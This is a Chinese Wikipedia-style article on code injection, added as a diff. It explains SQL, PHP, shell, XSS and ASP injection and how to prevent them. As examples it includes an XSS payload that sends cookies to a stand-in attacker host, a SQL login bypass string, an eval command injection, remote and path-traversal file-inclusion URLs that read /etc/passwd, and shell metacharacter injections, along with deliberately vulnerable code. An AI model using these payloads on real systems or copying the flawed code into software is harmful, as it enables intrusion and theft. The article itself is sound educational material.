@@ -1,0 +1,288 @@
+{{NoteTA
+|G1 = IT
+}}
+'''代碼注入'''（{{lang-en|Code injection}}）是因處理無效數據的而引發的[[程序錯誤|程序錯誤]]。代碼注入可被攻擊者用來導入代碼到某特定的電腦程式，以改變程式的執行進程或目的。代碼注入攻擊的結果可以是災難性的。例如說：代碼注入可作為許多[[電腦蠕蟲|電腦蠕蟲]]繁殖的溫床。
+
+== 概說及例子 ==
+
+舉例說，有一間公司的[[網頁伺服器|網頁伺服器]]上有一個[[簽名簿|簽名簿]]的程式碼，用來讓用戶發表簡短的口信，例如：
+<pre>
+Nice site!
+</pre>
+
+不過，這個程式碼原來有漏洞。一個意圖入侵者得悉這間公司採用了有問題的程式碼，於是試圖透過留下一條附帶有程式碼的口信，例如：
+<pre>
+Nice Site,  I think I'll take it.><script>document.location='http://some_attacker/cookie.cgi?' +document.cookie</script>
+</pre>
+
+如果另一個用戶檢視了該頁，被注入的代碼即執行。該代碼可讓攻擊者扮裝成另一個用戶。然而這個相同的軟體臭蟲可被使用者意外的觸發，亦即造成該網站暴露 HTML 代碼。
+<pre>
+That post was awesome, :>)
+</pre>
+
+在這個案例裡[[表情符號|表情符號]]可造成 HTML 代碼不對稱，因為不對稱的[[HTML|HTML]]標籤被注入到代碼裡。
+
+大部分這類的問題與哪些可能輸入資料，或者特殊資料效果的錯誤假設相關。一些軟體開發員可能犯下危險假設的經典範例如下：
+* 假設某程式介面使用的[[元字符|元字符]]永遠不會在輸入中出現；例如假設英文半形標點符號如引號或者半括弧永不出現。
+* 假設只有阿拉伯數字字符會當成輸入鍵入。
+* 假設輸入永遠不會超過固定欄位大小。
+* 假設阿拉伯數字只會相等或少於上限。
+* 假設阿拉伯數字只會相等或大於下限。
+* 假設用戶端原本伺服端提供的默認值 (例如[[表單(網路)|表單]]的隱藏欄位或者[[cookie|cookie]]) 無法於用戶端被用戶修改。這種假設忽略了眾所皆知的攻擊如[[cookie|cookie]]下毒：在此cookie值被惡意用戶強制設定。
+* 假設從輸入端取得指標或者陣列索引不會出問題。
+* 假設輸入端永遠不會提供關於它自己或者其他相關值的虛假資訊，例如檔案大小<ref>許多檔案格式開始直接宣告該檔案手頭有多少資料，以及某些其他值。在不細心開發的軟體中，了解在這宣告裡的資料總合可導致[[緩存溢出|緩存溢出]] (例如，編程不嚴謹的網頁瀏覽器)。這常常將代碼注入弱點攤在陽光下。這是許多波及檔案(特別是圖形以及媒體檔案)保全漏洞的背後的元兇。</ref>
+
+== 代碼注入的用途 ==
+=== 蓄意的用途 ===
+==== 惡意使用 ====
+代碼注入的使用一般被視為心懷惡意的舉動，而它確實常常如此。透過代碼注入技術在[[黑客|黑]]或者[[駭客_(電腦安全)|破解]]系統上，以取得信息、[[提權|提權]]、或者非法存取某系統是相當流行的。
+
+惡意用途的代碼注入可包括：
+* 透過SQL注入(見下文)隨意修改資料庫中的值。影響所及可從某網站外觀損毀，到對敏感資料嚴重的破壞。
+* 當用戶拜訪惡意網站時，透過網頁瀏覽器或其插件的漏洞安全隱患，進行代碼注入，以便安裝[[流氓軟件|流氓軟件]]到用戶機器上。
+* 透過'''PHP'''或者'''ASP注入'''安裝[[流氓軟件|流氓軟件]]或者執行惡意代碼於伺服器端。
+* 於UNIX系統利用'''Shell注入'''安全隱患對{{tsl|en|Setuid||setuid root}}二進位資料作修改，達成[[提權|提權]]到[[超級用戶|root]]使用權限的目的。
+* 於視窗系統利用'''Shell注入'''安全隱患對系統服務做手腳，達成[[提權|提權]]到[[超級用戶|本地端系統]]使用權限的目的。
+* 從網頁瀏覽器利用'''HTML/腳本注入'''(跨網站指令碼)進行連線竊取 / cookies竊取進而冒充他人，取得他人個人敏感資料。
+
+==== 善意使用 ====
+某些人可能會出於善意而使用代碼注入。例如，透過代碼注入以改變或者調試某程式或者系統的行為可以"擺弄"系統以某種方式表現其行為而不懷任何惡意。打比方說：
+
+* 代碼注入可以添入某原本搜尋結果頁面設計上沒有的欄位，方便用戶。
+* 透過對原本設計預設函式沒有曝光的欄位賦值，代碼注入可提供一個全新的方式來過濾、排序、或者歸類資料。
+
+這些人訴諸此種替代手段大致是下面幾種原因之一：
+* 對軟體中希望改進函式進行潤飾的其他方法證明不可能，或者
+* 其他對軟體修改的方式代價過高，或者
+* 其他對軟體修改的方式過度艱苦。
+
+一般開發社群對以此為目的的代碼注入不表歡迎。他們稱這種行為為三腳貓、半調子、或者駭 / 黑程式。(kludge or hack)
+
+某些開發者允許或者甚至表揚代碼注入的使用來「加強」他們的軟體；通常是因為該方案提供了較不昂貴的方式來實現新的或者特殊化的功能。不幸的是，其副作用與無法列管的蘊含式可能相當危險。
+
+一般來說，即使相當善意的代碼注入使用都不被建議使用。
+
+=== 非蓄意的用途 ===
+某些用戶可能會不經意的進行代碼注入，因為他們對程式提供的輸入，沒列在當初開發系統者的考慮中。例如：
+* 用戶可能視某個包含表示字符或者字符字串為合法輸入，而不知該字符被開發者所保留而有特殊意義 (像 "張三 & 李四" 裡的 "&" 字符，或者英文約翰的 M&M 巧克力： "John's M&M's"裡頭的單引號)。
+
+* 用戶可能會提交格式錯亂的檔案做為輸入。這種行為對單一程式沒什麼問題，但可能對整個接收系統是災難。
+
+== 避免代碼注入 ==
+
+要避免代碼注入的種種問題，得充分發揮[[輸入輸出處理保全|輸入輸出處理保全]]，例如：
+* 輸入確認。
+* 更換危險字元。例如在PHP透過<code>addslashes()</code>函式保護SQL注入。
+* 輸入編碼。
+* 輸出編碼。
+* 採用其他沒有飽受代碼注入漏洞困擾的編程實現，例如「參數化SQL查詢」 ("parameterized SQL queries" 又名 "prepared statements" 亦有時稱 "bind variables") 。
+
+== 代碼注入範例 ==
+=== SQL注入 ===
+{{main|SQL注入}}
+
+[[SQL注入|SQL注入]]是種乘SQL語法之利，注入可讀取或者修改資料庫、或者扭曲原始查詢意義的命令。
+
+以一個網頁有兩個欄位讓用戶輸入用戶名與密碼為例，在該網頁幕後工作的代碼會產生[[SQL|SQL]]查詢以檢查密碼是否與用戶名稱密碼列表相符：
+<syntaxhighlight lang="SQL">
+SELECT UserList.Username
+FROM UserList
+WHERE UserList.Username = 'Username'
+AND UserList.Password = 'Password'
+</syntaxhighlight>
+如果這查詢有回應行數，便允許該存取。然而，如果惡意用戶鍵入合法用戶名，並且在密碼欄注入某些合法代碼 (<code>"password' OR '1'='1"</code>)，查詢結果便如下所示：
+<syntaxhighlight lang="sql">
+SELECT UserList.Username
+FROM UserList
+WHERE UserList.Username = 'Username'
+AND UserList.Password = 'password' OR '1'='1'
+</syntaxhighlight>
+在上面範例裡，"Password"被假定為空白或者某個無害的字串。"<code>'1'='1'</code>"邏輯式將永遠為真，並且找到多少行就回應多少行，因此存取就被允許了。
+
+該技術可被精練成允許執行多重陳述，甚或載入外部程式。
+
+=== PHP注入 ===
+
+"PHP注入"、"ASP注入"、以及其他類似技術術語是創造來泛指其他種種允許攻擊者直接對伺服器腳本引擎提供代碼的代碼注入攻擊。在"PHP注入"實例裡，伺服端腳本引擎是[[PHP|PHP]]。
+
+實際上，PHP注入是「動態賦值安全隱患」、「包含檔案注入」、或者類似代碼注入的安全隱患。
+
+==== 動態賦值安全隱患 ====
+
+[http://www.mitre.org mitre.org]{{Wayback|url=http://www.mitre.org/ |date=20201214230803 }}的史蒂芬克利斯第 (Steven M. Christey)提議以這個名字作為這類型的代碼注入安全隱患。
+
+===== 動態賦值安全隱患 - Eval注入 =====
+
+eval注入安全隱患發生在攻擊者可控制所有或者部份作為「餵」給<code>[[eval|eval]]()</code>函式呼叫的輸入字串。<ref>{{cite web
+|url=http://seclists.org/lists/fulldisclosure/2006/May/0035.html
+|title=Dynamic Evaluation Vulnerabilities in PHP applications
+|author=[[Insecure.org|Insecure.org]]
+}}</ref>
+<syntaxhighlight lang="php">
+$myvar = 'somevalue'; 
+$x = $_GET['arg']; 
+eval('$myvar = ' . $x . ';');
+</syntaxhighlight>
+"<code>eval</code>"的參數將會視同PHP處理，所以額外的命令可被添加。例如：如果"arg"如果被設成"<code>10; system('/bin/echo uh-oh')</code>"，後面的"<code>system('/bin/echo uh-oh')</code>"代碼將被執行，這等同在伺服器上執行開發者意料外的程式。在這範例裡頭是"<code>/bin/echo</code>"。
+
+===== 動態賦值安全隱患 - 動態變數賦值 =====
+
+如在[http://seclists.org/lists/fulldisclosure/2006/May/0035.html "Dynamic Evaluation Vulnerabilities in PHP applications"]一文所定義的：
+PHP支援 "變數的變數"，意指變數或者表達式可以對其他變數名賦值。這種特性可用來於程式執行時期動態改變哪個變數被存取或給值。這種特性是把雙刃劍：強大、便利、同時也很危險。
+
+許多程式有下面類似代碼：
+<syntaxhighlight lang="php">
+$safevar = "0"; 
+$param1 = ""; 
+$param2 = ""; 
+$param3 = ""; 
+# my own "register globals" for param[1,2,3] 
+foreach ($_GET as $key => $value) { 
+  $$key = $value; 
+} 
+</syntaxhighlight>
+如果攻擊者在查詢字串中給定"<code>safevar=bad</code>"，那<code>$safevar</code>將會被設為值 "bad"。
+
+===== 動態賦值安全隱患 - 動態函式賦值 =====
+
+下面PHP範例將按照請求的方式執行函式。
+
+<syntaxhighlight lang="php">
+$myfunc = $_GET['myfunc']; 
+$myfunc(); 
+</syntaxhighlight>
+以及：
+<syntaxhighlight lang="php">
+$myfunc = $_GET['myfunc']; 
+${"myfunc"}(); 
+</syntaxhighlight>
+
+==== 包含檔案注入 ====
+考慮下面的PHP程式(這裡包含了個檔案可因應需求改變)：
+<syntaxhighlight lang="php">
+<?php
+   $color = 'blue';
+   if (__isset( $_GET['COLOR'] ) )
+      $color = $_GET['COLOR'];
+   require( $color . '.php' );
+?>
+</syntaxhighlight>
+<syntaxhighlight lang="xml">
+<form method="get">
+   <select name="COLOR">
+      <option value="red">red</option>
+      <option value="blue">blue</option>
+   </select>
+   <input type="submit">
+</form>
+</syntaxhighlight>
+
+開發者認為這樣大概可以保證只有 blue.php 和 red.php 可被載入。不過隨著任何人可在<code>COLOR</code>輕易的插入隨意值，造成以下檔案注入的可能性：
+* <code>/vulnerable.php?COLOR='''<nowiki>http://evil/exploit?</nowiki>'''</code> - 注入遠端機器上有漏洞的檔案。
+* <code>/vulnerable.php?COLOR='''C:\\ftp\\upload\\exploit'''</code> - 從一個已經上載、叫做exploit.php檔案運行其代碼。
+* <code>/vulnerable.php?COLOR='''../../../../../../../../etc/passwd%00'''</code> - 讓攻擊者取得該UNIX系統目錄檢索下密碼檔案的內容。
+* <code>/vulnerable.php?COLOR='''C:\\notes.txt%00'''</code> - 一個使用[[空字元|空]][[元字符|元字符]]以解除<code>.php</code>副檔名限制，允許存取其他非 .php 結尾檔案。 (PHP預設值"magic_quotes_gpc = On"可以終止這種攻擊)
+
+==== Shell注入====
+Shell注入又稱命令行界面注入，它命名源於[[Unix_Shell|Unix Shell]]，不過可套用到大部分允許軟體程式化地執行[[命令列介面|命令列介面]]的系統上。常見的Shell注入資源有<code>system()</code>、<code>StartProcess()</code>、<code>java.lang.Runtime.exec()</code>、<code>System.Diagnostics.Process.Start()</code>以及類似的應用程式介面。
+
+考慮下面的簡短PHP程式。它執行一段叫做'''funnytext'''的外部程式，以置換用戶送出的許多其他單字：
+
+<syntaxhighlight lang="php">
+<?php
+passthru ( " /home/user/phpguru/funnytext " 
+           . $_GET['USER_INPUT'] );
+?>
+</syntaxhighlight>
+
+該程式可以以多種方式被注入：
+* '''`命令`''' 將會執行 '''命令'''.
+* '''$(命令)''' 將會執行 '''命令'''.
+* '''; 命令''' 將會執行 '''命令'''，並輸出命令的結果。
+* '''| 命令''' 將會執行 '''命令'''，並輸出命令的結果。
+* '''&& 命令''' 將會執行 '''命令'''，並輸出命令的結果。
+* '''|| 命令''' 將會執行 '''命令'''，並輸出命令的結果。
+* '''> /home/user/phpguru/.bashrc''' 將會覆寫檔案 '''.bashrc'''.
+* '''< /home/user/phpguru/.bashrc''' 將會將檔案 '''.bashrc''' 送出，當成是 '''funnytext''' 的輸入。
+
+註：命令指的是命令行介面下可供輸入執行的命令，例如視窗平台的 dir、UNIX 平台的 ls 等等。
+
+PHP提供<code>[http://www.php.net/manual/en/function.escapeshellarg.php escapeshellarg()]</code>和<code>[http://www.php.net/manual/en/function.escapeshellcmd.php escapeshellcmd()]</code>以在呼叫方法以前進行'''編碼'''。然而，實際上並不建議相信這些方法是安全的 - 同樣必須對輸入確認 / 消毒。
+
+=== HTML注入/腳本注入 (跨網站指令碼) ===
+{{main|跨網站指令碼}}
+HTML注入/腳本注入是個炒得相當熱的話題，一般專業術語為跨網站指令碼（Cross-site scripting，通常簡稱為XSS）。XSS指的是一種依靠用戶輸入到網頁腳本，或者某些像代碼行被置於輸出HTML，而沒有檢查HTML代碼或腳本的注入漏洞。
+
+這種注入有兩個基本型如下：
+
+;主動式 (型 1)
+:這種型態的XSS漏洞比較不危險，因為用戶輸入被置於動態產生的網頁。伺服器端沒有任何改變。
+
+;被動式 (型 2)
+:這種型態比較危險，因為輸入是寫在靜態網頁上，故威脅是持續性的。
+
+==== 於IE7透過感染的動態連結函式庫(DLL)實行HTML注入 ====
+根據英國技術網站''The Register''的<ref>{{Cite web |url=http://www.theregister.co.uk/2007/05/25/strange_spoofing_technique/ |title=Strange spoofing technique evades anti-phishing filters {{!}} The Register<!-- Bot generated title --> |accessdate=2008-08-23 |archive-date=2019-07-09 |archive-url=https://web.archive.org/web/20190709055414/https://www.theregister.co.uk/2007/05/25/strange_spoofing_technique/ |dead-url=no }}</ref>文獻指出，HTML注入亦可發生在用戶本身被有問題的DLL感染過的系統身上。該文獻引用羅傑湯森 (Roger Thompson) 的說法：受害者的瀏覽器，實際上，訪問了PayPal或其他類似的網站，甚或某動態連結檔案將它自己插入IE，並試著在交易進行中讀取並修改HTML。該文獻提及使用這種手段的釣魚攻擊順利規避IE7與賽門鐵克嘗試偵測可疑網站的努力。
+
+=== ASP注入 ===
+"ASP注入"、"PHP注入"、以及其他類似技術術語是創造來泛指其他種種允許攻擊者直接對伺服器指令碼引擎提供代碼的代碼注入攻擊。在"ASP注入"實例裡，伺服端指令碼引擎是微軟[[Active_Server_Pages|Active Server Pages]]，一種微軟IIS的外加元件。
+
+在實際上與PHP相似，ASP注入也是「動態賦值安全隱患」、「包含檔案注入」、或者類似代碼注入的安全隱患。
+
+範例：
+<syntaxhighlight lang="asp">
+<%
+    If Not IsEmpty(Request( "username" ) ) Then
+        Const ForReading = 1, ForWriting = 2, ForAppending = 8
+        Dim fso, f
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
+        f.Write Request("username") & vbCrLf
+        f.close
+        Set f = nothing
+        Set fso = Nothing
+        %>
+         <h1>List of logged users:</h1>
+         <pre>
+        <%
+         Server.Execute( "userlog.txt" )
+        %>
+         </pre>
+        <%
+    Else
+        %>
+         <form>
+         <input name="username" /><input type="submit" name="submit" />
+         </form>
+        <%
+    End If
+%>
+</syntaxhighlight>
+
+在這個範例中，用戶可用命令而非用戶名取代輸入。
+
+== 參看 ==
+* [[除錯|除錯]]
+* [[惡意程式|惡意程式]]：[[木馬程式|木馬程式]]
+
+== 參考 ==
+{{Reflist}}
+
+== 外部連結 ==
+*Article "[http://www.cgisecurity.com/articles/xss-faq.shtml The Cross-site Scripting FAQ]{{WebCite|url=https://www.webcitation.org/61DX53rTG?url=http://www.cgisecurity.com/articles/xss-faq.shtml |date=20110826035558 |dateformat=iso }}" By Robert CGISecurity.com
+*Article "[https://web.archive.org/web/20041010124514/http://www.codeproject.com/threads/winspy.asp Three Ways to Inject Your Code into Another Process]" by Robert Kuster
+*Article "[https://web.archive.org/web/20060209035745/http://www.codeproject.com/system/inject2exe.asp Inject your code to a Portable Executable file]" by A. Danehkar
+*Article "[https://web.archive.org/web/20070410133521/http://www.codeproject.com/system/inject2it.asp Injective Code inside Import Table]" by A. Danehkar
+*Article "[https://web.archive.org/web/20060301133252/http://chris.vandenberghe.org/publications/csse_raid2005.pdf Defending against Injection Attacks through Context-Sensitive String Evaluation (CSSE)]" by Tadeusz Pietraszek and Chris Vanden Berghe
+*News article "[https://web.archive.org/web/20050924080540/http://www.emsisoft.com/en/kb/articles/news041104/ Flux spreads wider]" - First [[Trojan_horse_(computing)|Trojan horse]] to make use of code injection to prevent detection from a [[firewall_(networking)|firewall]]
+*[http://www.thedailywtf.com/ The Daily WTF]{{Wayback|url=http://www.thedailywtf.com/ |date=20201211201213 }} regularly reports real-world incidences of susceptibility to code injection in software.
+*[https://web.archive.org/web/20071014070701/http://armorize.com/resources/vulnerability.php?rdChart=Chart1&Keyword=code+injection&dbxCategory=ALL_Category&dbxYear=ALL_Year&dbxLanguage=ALL_Language Known code injection vulnerabilities since 2001] by Armorize Technologies
+
+===知名的代碼注入檢測程式===
+*[http://www.nstalker.com/ N-Stalker Web Application Security Scanner]{{Wayback|url=http://www.nstalker.com/ |date=20020529214346 }}
+*[http://www.syhunt.com/sandcat Sandcat]{{Wayback|url=http://www.syhunt.com/sandcat |date=20200530040656 }}
+*[http://www.acunetix.com/ Web Vulnerability Scanner]{{Wayback|url=http://www.acunetix.com/ |date=20140610105644 }}
+*[https://web.archive.org/web/20080820094630/http://www.elanize.com/ Maui Security Scanner]
+
+[[Category:惡意軟件|Category:惡意軟件]]
+[[Category:注入漏洞|Category:注入漏洞]]
